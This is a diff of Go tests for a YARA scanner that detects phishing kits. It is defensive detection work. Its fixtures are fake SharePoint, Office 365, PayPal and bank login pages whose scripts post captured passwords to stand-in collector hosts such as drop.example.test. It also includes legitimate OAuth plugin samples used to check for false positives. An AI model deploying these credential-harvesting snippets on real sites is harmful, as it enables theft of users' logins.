@@ -17,6 +17,13 @@ func TestPhishingSharepoint_JavaScriptSubmission(t *testing.T) {
 	if !hasYaraRule(s.ScanBytes(mal), "phishing_sharepoint") {
 		t.Error("phishing_sharepoint gap: kit submitting through JavaScript not detected")
 	}
+	extensionless := []byte(`<html><head><title>SharePoint - secured by Microsoft</title></head>
+<body><form id="l"><input type="password" name="p"></form>
+<script>fetch('https://collector.example.test/collect', {method: 'POST', body: new FormData(document.getElementById('l'))});</script>
+</body></html>`)
+	if !hasYaraRule(s.ScanBytes(extensionless), "phishing_sharepoint") {
+		t.Error("phishing_sharepoint gap: extensionless JavaScript collector not detected")
+	}
 	legit := []byte(`<div class="wrap"><h1>OneDrive backup</h1>
 <p>Connect this site to OneDrive and Microsoft 365.</p>
 <form method="post"><input type="password" name="onedrive_app_secret" autocomplete="off"></form>
@@ -36,21 +43,21 @@ func TestPhishingBrandFamily_JavaScriptSubmission(t *testing.T) {
 			rule: "phishing_office365",
 			sample: `<html><head><title>Office 365</title></head><body>
 <form id="f"><input type="password" name="passwd"></form>
-<script>document.getElementById('f').addEventListener('submit', function (e) { e.preventDefault(); navigator.sendBeacon('https://drop.example.test/o365.php', new FormData(this)); });</script>
+<script>document.getElementById('f').addEventListener('submit', function (e) { e.preventDefault(); navigator.sendBeacon('https://drop.example.test/collect', new FormData(this)); });</script>
 </body></html>`,
 		},
 		{
 			rule: "phishing_paypal",
 			sample: `<html><head><title>PayPal - Log in</title></head><body>
 <form id="f"><input type="password" name="pw"></form>
-<script>var x = new XMLHttpRequest(); x.open('POST', 'https://drop.example.test/pp.php'); x.send(new FormData(document.getElementById('f')));</script>
+<script>var x = new XMLHttpRequest(); x.open('POST', 'https://drop.example.test/collect', true); x.send(new FormData(document.getElementById('f')));</script>
 </body></html>`,
 		},
 		{
 			rule: "phishing_bank_generic",
 			sample: `<html><body><h1>Online banking</h1><p>Enter your account number and security code.</p>
 <form id="f"><input type="password" name="pin"></form>
-<script>jQuery.ajax({url: 'https://drop.example.test/bank.php', method: 'POST', data: jQuery('#f').serialize()});</script>
+<script>jQuery.ajax({url: 'https://drop.example.test/collect', method: 'POST', data: jQuery('#f').serialize()});</script>
 </body></html>`,
 		},
 	}
@@ -68,6 +75,14 @@ func TestPhishingBrandFamily_JavaScriptSubmission(t *testing.T) {
 <script>var cfg = {url: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize', client: id};</script></div>`)
 	if hasYaraRule(s.ScanBytes(oauth), "phishing_office365") {
 		t.Error("phishing_office365 FP: plugin settings screen naming the brand OAuth endpoint matched")
+	}
+	oauthPOST := []byte(`<div class="wrap"><h1>Office 365 mailer</h1>
+<form method="post"><input type="password" name="o365_client_secret"></form>
+<script>fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
+method: 'POST', body: new URLSearchParams({client_id: id, client_secret: secret})
+});</script></div>`)
+	if hasYaraRule(s.ScanBytes(oauthPOST), "phishing_office365") {
+		t.Error("phishing_office365 FP: plugin posting OAuth parameters to the brand endpoint matched")
 	}
 
 	// An SMTP plugin settings screen names the brand, takes a password, and
